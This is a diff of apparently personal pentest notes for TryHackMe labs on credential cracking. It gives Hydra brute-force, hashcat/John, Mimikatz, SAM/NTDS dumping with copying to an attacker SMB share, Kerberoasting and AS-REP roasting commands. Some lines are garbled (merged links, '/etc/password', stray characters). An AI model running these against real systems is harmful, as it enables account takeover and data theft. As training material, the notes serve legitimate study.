@@ -1,12 +1,24 @@
 # Credential Gathering & Cracking
 
-Stopped at Windows Credential Manager on [credential-harvesting.md](credential-harvesting.md "mention")
+Finished at [magician.md](../../walkthroughs/tryhackme/magician.md "mention")
 
 ## Analyzing Hashes
 
 ### Websites
 
-**Hash Analyzer:** [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)
+**Hash Analyzer**
+
+* &#x20;[https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)
+* [https://www.onlinehashcrack.com/hash-identification.php](https://www.onlinehashcrack.com/hash-identification.php)
+* [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+
+#### Hash Cracking Websites
+
+* [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hashhttps://crackstation.net/)
+* [https://crackstation.net/](https://hashes.com/en/decrypt/hashhttps://crackstation.net/)
+* [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+
+
 
 ### Hash ID
 
@@ -23,7 +35,7 @@ python3 hash-id.py $HASH
 
 #### Examples
 
-[password-attacks.md](password-attacks.md "mention")
+[password-attacks.md](password-attacks.md "mention") [red-team-capstone-challenge.md](../../walkthroughs/tryhackme/red-team-capstone-challenge.md "mention")
 
 In some cases the default password lists aren't enough. We may get some sort of clue that shows we should use a modified list. Below are some general steps to follow to create it. First make a format that it should follow some sort of standard. Below we are going to make our list with the below criteria as an example does the following:
 
@@ -31,7 +43,7 @@ In some cases the default password lists aren't enough. We may get some sort of 
 2. Have two consecutive digits somewhere in the password.
 3. Start with one of the specified special characters (!, @, #, $).
 
-### **Explanation**
+#### **Explanation**
 
 * `Az`: This part of the rule specifies that the rule is applied only to passwords containing at least one uppercase letter (`A-Z`) followed by a lowercase letter (`a-z`).
 * `"[0-9][0-9]"`: This part of the rule indicates that the password should contain two consecutive digits (numbers from 00 to 99).
@@ -58,15 +70,13 @@ john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
 
 #### Examples
 
-[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")
+[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")[brute-it.md](../../walkthroughs/tryhackme/brute-it.md "mention")
 
 **Kali**
 
 ```
 hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
-
-
 
 ### **Crafting request for Hydra**
 
@@ -98,15 +108,13 @@ hydra -l $USERNAME -P dict.lst $VICTIM http-get-form "/login-get/index.php:usern
 
 
 
-
-
 ## **SSH**
 
 ### Brute force SSH
 
 #### Examples
 
-[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")
+[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")[brooklyn-nine-nine.md](../../walkthroughs/tryhackme/brooklyn-nine-nine.md "mention")[gamingserver.md](../../walkthroughs/tryhackme/gamingserver.md "mention")[fowsniff-ctf.md](../../walkthroughs/tryhackme/fowsniff-ctf.md "mention")[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")[library.md](../../walkthroughs/tryhackme/library.md "mention")
 
 **Kali**
 
@@ -118,7 +126,7 @@ hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100
 
 #### Examples
 
-[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")
+[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[brute-it.md](../../walkthroughs/tryhackme/brute-it.md "mention")[gamingserver.md](../../walkthroughs/tryhackme/gamingserver.md "mention")[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")
 
 **Kali**
 
@@ -127,9 +135,29 @@ hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100
 john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
 ```
 
+
+
+## FTP
+
+### Crack password for a specific username
+
+#### Examples
+
+[agent-sudo.md](../../walkthroughs/tryhackme/agent-sudo.md "mention")[year-of-the-rabbit.md](../../walkthroughs/tryhackme/year-of-the-rabbit.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ftp://$VICTIM
+```
+
 ## SMTP
 
-Crack password for a specfic username
+### Crack password for a specific username
+
+#### Examples
+
+[password-attacks.md](password-attacks.md "mention")
 
 **Kali**
 
@@ -137,13 +165,41 @@ Crack password for a specfic username
 hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt smtp://$VICTIM:25 -v
 ```
 
+### Crack username and passwords
+
+#### Examples
+
+[red-team-capstone-challenge.md](../../walkthroughs/tryhackme/red-team-capstone-challenge.md "mention")
+
+**Kali**
+
+```
+hydra -L usernames.txt -P passwords.txt smtp://$VICTIM -v
+```
+
+## POP3
+
+### Crack username and passwords
+
+#### Examples
+
+[fowsniff-ctf.md](../../walkthroughs/tryhackme/fowsniff-ctf.md "mention")
+
+**Kali**
+
+```
+hydra -L usernames.txt -P passwords.txt -f $VICTIM pop3 -V
+```
+
 ## Files
+
+
 
 ### Protected Zip Files
 
 #### Examples
 
-[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")
+[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[agent-sudo.md](../../walkthroughs/tryhackme/agent-sudo.md "mention")[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")
 
 **Kali**
 
@@ -165,13 +221,133 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
 ```
 
+### PGP Keys
+
+#### Examples
+
+[anonforce.md](../../walkthroughs/tryhackme/anonforce.md "mention")
+
+**Kali**
+
+```
+/opt/john/gpg2john private.asc > pgp.hash
+john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+gpg --import private.asc 
+Password: $PASSWORD - one in screenshot above
+```
+
+<figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>
+
+### KeePass&#x20;
+
+**Examples**
+
+[opacity.md](../../walkthroughs/tryhackme/opacity.md "mention")
+
+**Kali**
+
+```
+/opt/john/keepass2john dataset.kdbx > johnkeepass.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt johnkeepass.txt 
+```
+
+<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+keepassx dataset.kdbx 
+Password: $PASSWORD
+```
+
+### Images
+
+#### **Steghide**
+
+Used to get hidden messages/files from a image. Requires a password.&#x20;
+
+#### Examples
+
+[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")[tokyo-ghoul.md](../../walkthroughs/tryhackme/tokyo-ghoul.md "mention")[blog.md](../../walkthroughs/tryhackme/blog.md "mention")
+
+**Kali**
+
+```
+steghide extract -sf $IMAGE.jpg
+Password: $PASSWORD
+```
+
+<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+
+#### binwalk
+
+Used to get hidden messages/files from a image.&#x20;
+
+#### Examples
+
+[agent-sudo.md](../../walkthroughs/tryhackme/agent-sudo.md "mention")[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")
+
+**Kali**
+
+```
+binwalk $IMAGE.jpg 
+binwalk $IMAGE.jpg -e
+```
+
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+
+### Firefox
+
+#### Examples
+
+[glitch.md](../../walkthroughs/tryhackme/glitch.md "mention")
+
+**Victim**
+
+```
+tar -cvf backup.tar.gz .firefox/
+```
+
+Send backup.tar.gz file to Kali
+
+**Kali**
+
+```
+tar xvf backup.tar.gz 
+git clone https://github.com/unode/firefox_decrypt.git
+python3.9  firefox_decrypt/firefox_decrypt.py .firefox/
+```
+
+### Bin&#x20;
+
+May be able to find important info from a bin file.
+
+#### Examples
+
+[valley.md](../../walkthroughs/tryhackme/valley.md "mention")
+
+**Kali**
+
+```
+strings $binFile > out.txt
+```
+
+## Linux Credentials
+
 ### Shadow
 
 #### Examples
 
-[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")
+[linux-privilege-escalation.md](../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention")[wgel-ctf.md](../../walkthroughs/tryhackme/wgel-ctf.md "mention")[brute-it.md](../../walkthroughs/tryhackme/brute-it.md "mention")[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")
 
-If /etc/shadow is readable you might be able to crack the hashes.
+If /etc/password and /etc/shadow are readable or you can somehow download them you might be able to crack the hashes.
 
 **Victim**
 
@@ -198,6 +374,59 @@ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
 
+
+## Windows Credentials
+
+**Examples**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+### Clear-text files
+
+As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path:&#x20;
+
+```
+C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.
+
+**Victim(cmd)**
+
+```
+reg query HKLM /f password /t REG_SZ /s
+OR
+reg query HKCU /f password /t REG_SZ /s
+```
+
+<figure><img src="../../.gitbook/assets/image (9) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+### Local Windows Credentials
+
+**Examples**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.&#x20;
+
+First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the `c:\Windows\System32\config\sam` file:
+
+**Victim(cmd)**
+
+```
+type c:\Windows\System32\config\sam
+copy c:\Windows\System32\config\sam C:\Users\thm\Desktop\ 
+```
+
+<figure><img src="../../.gitbook/assets/image (9) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+### Metasploit's HashDump
+
+**Examples**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the [rapid7 ](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/)blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!
 
 ### Volume Shadow Copy Service
 
@@ -357,6 +586,29 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
 ```
 
+### Mimikatz - Credential Manager
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.
+
+**Victim(cmd)**
+
+```
+c:\Tools\Mimikatz\mimikatz.exe
+```
+
+**Victim(mimikatz)**
+
+```
+privilege::debug
+sekurlsa::credman
+```
+
+<figure><img src="../../.gitbook/assets/image (45) (3).png" alt=""><figcaption></figcaption></figure>
+
 ### Protected LSASS
 
 **Example**
@@ -461,9 +713,503 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
 ```
 
-## Windows Cred
+## Windows Credential Manager
+
+### Accessing Credential Manager
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.
+
+<figure><img src="../../.gitbook/assets/image (7) (10).png" alt=""><figcaption></figcaption></figure>
+
+We will be using the Microsoft Credentials Manager `vaultcmd` utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.&#x20;
+
+**Victim(cmd)**
+
+```
+vaultcmd /list
+```
+
+<figure><img src="../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>
+
+By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.
+
+Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with `/listproperties`.
+
+**Victim(cmd)**
+
+```
+VaultCmd /listproperties:"Web Credentials"
+```
+
+<figure><img src="../../.gitbook/assets/image (118) (1).png" alt=""><figcaption></figcaption></figure>
+
+The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,
+
+**Victim(cmd)**
+
+```
+VaultCmd /listcreds:"Web Credentials"
+```
+
+<figure><img src="../../.gitbook/assets/image (35) (3).png" alt=""><figcaption></figcaption></figure>
+
+### Credential Dumping
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1, which is already included in the attached VM.
+
+**Get-WebCredentials.ps1**
+
+```
+function Get-WebCredentials
+{
+<#
+.SYNOPSIS
+Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)
+
+.DESCRIPTION
+This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script 
+also needs PowerShell v3 onwards and must be run from an elevated shell.
+
+.EXAMPLE
+PS > Get-WebCredentials
+
+.LINK
+https://github.com/samratashok/nishang
+#>
+[CmdletBinding()] Param ()
+
+
+#http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
+$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$VaultObj = new-object Windows.Security.Credentials.PasswordVault
+$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
+}
+```
+
+Ensure to execute PowerShell with bypass policy to import it as a module as follows,
+
+**Victim(cmd)**
+
+```
+powershell -ex bypass
+Import-Module C:\Tools\Get-WebCredentials.ps1
+Get-WebCredentials
+```
+
+<figure><img src="../../.gitbook/assets/image (15) (9).png" alt=""><figcaption></figcaption></figure>
+
+The output shows that we obtained the username and password for accessing the internal application.
+
+### RunAs
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.
+
+Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.
+
+**Victim(cmd)**
+
+```
+cmdkey /list
+```
+
+The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+```
+runas /savecred /user:THM.red\thm-local cmd.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (36) (4).png" alt=""><figcaption></figcaption></figure>
+
+A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.
+
+### Domain Controller
+
+This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
+
+### NTDS Domain Controller
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:
+
+* Schema table: it contains types of objects and their relationships.
+* Link table: it contains the object's attributes and their values.
+* Data type: It contains users and groups.
+
+NTDS is located in`C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the `SECURITY` file system. Therefore, we must also dump the security file containing all required files to decrypt.&#x20;
+
+### Ntdsutil
+
+\
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as&#x20;
+
+* Restore deleted objects in Active Directory.
+* Perform maintenance for the AD database.
+* Active Directory snapshot management.
+* Set Directory Services Restore Mode (DSRM) administrator passwords.
+
+For more information about Ntdsutil, you may visit the Microsoft documentation [page](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)).
+
+### Local Dumping (No Credentials)
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller.&#x20;
+
+To successfully dump the content of the NTDS file we need the following files:
+
+* C:\Windows\NTDS\ntds.dit
+* C:\Windows\System32\config\SYSTEM
+* C:\Windows\System32\config\SECURITY
+
+The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.
+
+**Victim(cmd)**
+
+```
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (4).png" alt=""><figcaption></figcaption></figure>
+
+Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
+
+<figure><img src="../../.gitbook/assets/image (22) (7).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Kali**
+
+```
+mkdir public
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username $USERNAME -password $PASSWORD smb public/
+```
+
+**Victim(cmd)**
+
+```
+cd C:\temp\
+net use \\$KALI\smb
+copy "C:\temp\Active Directory\ntds.dit" \\$KALI\smb \\$KALI\smb
+copy "C:\temp\registry\SECURITY" \\$KALI\smb
+copy "C:\temp\registry\SYSTEM" \\$KALI\smb
+```
+
+**Kali**
+
+```
+cd public
+python3.9 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
+```
+
+<figure><img src="../../.gitbook/assets/image (14) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+
+Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat `-m 1000` mode to crack the Windows NTLM hashes as follows:
+
+**Kali**
+
+```
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Domain Controller - Local Administrator Password Solution (LAPS)
+
+This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.
+
+### Group Policy Preferences (GPP)
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).
+
+GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.
+
+The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on [MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN). Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).
+
+### Local Administrator Password Solution (LAPS)
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.
+
+The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.
+
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+
+### Enumerate for LAPS
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.
+
+**Victim(cmd)**
+
+```
+dir "C:\Program Files\LAPS\CSE"
+```
+
+<figure><img src="../../.gitbook/assets/image (7) (2) (3) (2).png" alt=""><figcaption></figcaption></figure>
+
+The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,
+
+**Victim(cmd)**
+
+```
+powershell
+Get-Command *AdmPwd*
+```
+
+<figure><img src="../../.gitbook/assets/image (6) (2) (5).png" alt=""><figcaption></figcaption></figure>
+
+Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity \* argument to list all available OUs.
+
+**Victim(cmd)**
+
+```
+Find-AdmPwdExtendedRights -Identity THMorg
+```
+
+<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.
+
+**Victim(powershell)**
+
+```
+ net groups "LAPsReader"
+```
+
+<figure><img src="../../.gitbook/assets/image (5) (3) (3).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(powershell)**
+
+```
+net user bk-admin
+```
+
+<figure><img src="../../.gitbook/assets/image (9) (2) (3) (2).png" alt=""><figcaption></figcaption></figure>
+
+### Getting the Password
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.
+
+**Victim(powershell)**
+
+```
+Get-AdmPwdPassword -ComputerName creds-harvestin
+```
+
+<figure><img src="../../.gitbook/assets/image (2) (2) (5).png" alt=""><figcaption></figcaption></figure>
+
+It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) PowerShell script in `C:\Tool`to try it out.
+
+## Domain Controller Other Attacks
+
+In the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.
+
+This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with [Kerberos protocol](https://en.wikipedia.org/wiki/Kerberos\_\(protocol\)) and New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.
+
+### Kerberoasting
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 3).
+
+Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.
+
+**Kali**
+
+```
+python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip $VICTIM $DOMAIN/$USERNAME
+Password: $PASSWORD
+```
+
+<figure><img src="../../.gitbook/assets/image (8) (1) (6).png" alt=""><figcaption></figcaption></figure>
+
+The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.
+
+The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.
+
+**Kali**
+
+```
+python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip $VICTIM $DOMAIN/$USERNAME -request-user $OTHERUSER
+Password: $PASSWORD
+```
+
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (7).png" alt=""><figcaption></figcaption></figure>
+
+Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using `-m 13100` mode as follows,
+
+**Kali**
+
+```
+hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt --show
+```
+
+<figure><img src="../../.gitbook/assets/image (12) (1) (5).png" alt=""><figcaption></figcaption></figure>
+
+Try replicating the steps against the attached VM by finding the SPN user and then performing the Kerberoasting attack. Once you have obtained the ticket, crack it and answer the question below.
+
+### AS-REP Roasting
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!
+
+<figure><img src="../../.gitbook/assets/image (11) (3) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a `users.lst` list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.
+
+**users.lst**
+
+```
+Administrator
+admin
+thm
+test
+sshd
+victim
+CREDS-HARVESTIN$
+```
+
+We will be using the Impacket Get-NPUsers script this time as follows,
+
+**Kali**
+
+```
+python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip $VICTIM $DOMAIN/ -usersfile users.lst
+```
+
+<figure><img src="../../.gitbook/assets/image (4) (2) (6) (1).png" alt=""><figcaption></figcaption></figure>
+
+We specified the IP address of the domain controller with the `-dc-ip` argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.
+
+Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the `-format` argument.
+
+### SMB Relay Attack
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources.&#x20;
+
+We suggest checking the THM[ Exploiting AD](https://tryhackme.com/room/exploitingad) room for more information about the SMB relay attack.
+
+### LLMNR/NBNS Poisoning
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.
+
+The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service. If you want to learn more about the attack, we suggest checking THM [Breaching AD](https://tryhackme.com/room/breachingad) room.
+
+The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine.&#x20;
+
+### Secretdump
+
+**Example**
+
+[red-team-capstone-challenge.md](../../walkthroughs/tryhackme/red-team-capstone-challenge.md "mention")
+
+#### Get Hashes
+
+You will need a username and password of another user. Some users can get more usernames and hashes than others.
+
+**Kali**
+
+```
+L/usr/local/bin/secretsdump.py $DOMAIN/USERNAME:'$PASSWORD'@DC-IP
+```
+
+## Login with hashes
+
